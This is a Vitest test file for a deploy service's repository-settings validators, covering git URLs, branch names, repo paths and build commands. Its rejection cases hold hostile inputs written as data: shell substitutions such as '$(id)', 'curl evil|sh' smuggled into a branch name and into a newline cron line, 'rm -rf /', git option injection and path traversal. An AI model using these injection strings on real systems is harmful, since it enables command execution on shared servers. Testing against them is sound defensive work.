import { describe, it, expect, afterEach } from 'vitest';
import {
  validateGitRepoUrl,
  validateGitBranch,
  validateRepoRelativePath,
  validateSingleLineCommand,
  firstRepoSettingsError,
} from './repo-settings-validate';

/** These values reach a root shell on the deploy server — the shared runner hosts many customers. */
describe('validateGitRepoUrl', () => {
  afterEach(() => {
    delete process.env.PUSHIFY_ALLOW_LOCAL_REPOS;
  });

  it('accepts ordinary https remotes', () => {
    for (const url of [
      'https://github.com/acme/site',
      'https://github.com/acme/site.git',
      'https://gitlab.com/group/sub/repo.git',
      'http://git.internal.example:3000/acme/app.git',
    ]) {
      expect(validateGitRepoUrl(url)).toBeNull();
    }
  });

  it("refuses file:// — it cloned another customer's checkout on the shared runner", () => {
    expect(validateGitRepoUrl('file:///opt/pushify/apps/victim/repo')).toMatch(/https/);
  });

  it('allows file:// only when explicitly enabled (the e2e box)', () => {
    process.env.PUSHIFY_ALLOW_LOCAL_REPOS = '1';
    expect(validateGitRepoUrl('file:///tmp/fixture')).toBeNull();
  });

  it('refuses other schemes and shell characters', () => {
    expect(validateGitRepoUrl('ssh://git@github.com/a/b')).not.toBeNull();
    expect(validateGitRepoUrl('ext::sh -c touch% /tmp/x')).not.toBeNull();
    expect(validateGitRepoUrl('https://github.com/a/b$(id)')).not.toBeNull();
    expect(validateGitRepoUrl('https://github.com/a/b`id`')).not.toBeNull();
    expect(validateGitRepoUrl('not a url')).not.toBeNull();
  });
});

describe('validateGitBranch', () => {
  it('accepts real-world branch names', () => {
    for (const branch of ['main', 'feature/login-v2', 'release/0.2.0-beta.62', 'fix_bug+1', 'user@team/wip']) {
      expect(validateGitBranch(branch)).toBeNull();
    }
  });

  it('refuses shell metacharacters git itself would allow', () => {
    for (const branch of ['x;curl evil|sh', 'a$(id)', 'a`id`', 'a&&b', 'a|b', 'a>b', "a'b"]) {
      expect(validateGitBranch(branch)).not.toBeNull();
    }
  });

  it('refuses option-looking and traversal names', () => {
    expect(validateGitBranch('--upload-pack=touch')).not.toBeNull();
    expect(validateGitBranch('a..b')).not.toBeNull();
    expect(validateGitBranch('')).not.toBeNull();
  });
});

describe('validateRepoRelativePath', () => {
  it('accepts paths inside the repository', () => {
    for (const p of ['.', '/', 'apps/web', '/apps/web/', 'docker/Dockerfile.prod', 'packages/@acme/api']) {
      expect(validateRepoRelativePath(p, 'Root directory')).toBeNull();
    }
  });

  it('refuses leaving the repository — it built (or wrote into) other paths on the server', () => {
    for (const p of ['../other/repo', 'apps/../../..', '../../../../etc/cron.d']) {
      expect(validateRepoRelativePath(p, 'Root directory')).toMatch(/inside the repository/);
    }
  });

  it('refuses shell characters and spaces', () => {
    expect(validateRepoRelativePath('apps/web; rm -rf /', 'Root directory')).not.toBeNull();
    expect(validateRepoRelativePath('apps/$(id)', 'Root directory')).not.toBeNull();
  });
});

describe('validateSingleLineCommand', () => {
  it('accepts one-line commands', () => {
    expect(validateSingleLineCommand('npm ci && npm run build', 'Build command')).toBeNull();
  });

  it('refuses newlines (they become extra Dockerfile / cron lines)', () => {
    expect(validateSingleLineCommand('npm run build\n* * * * * root curl evil|sh', 'Build command')).toMatch(/single line/);
  });
});

describe('firstRepoSettingsError', () => {
  it('reports the first problem and ignores unset values', () => {
    expect(firstRepoSettingsError({ gitRepoUrl: 'https://github.com/a/b', gitBranch: null })).toBeNull();
    expect(firstRepoSettingsError({ gitRepoUrl: 'https://github.com/a/b', rootDirectory: '../x' })).toMatch(/Root directory/);
  });
});
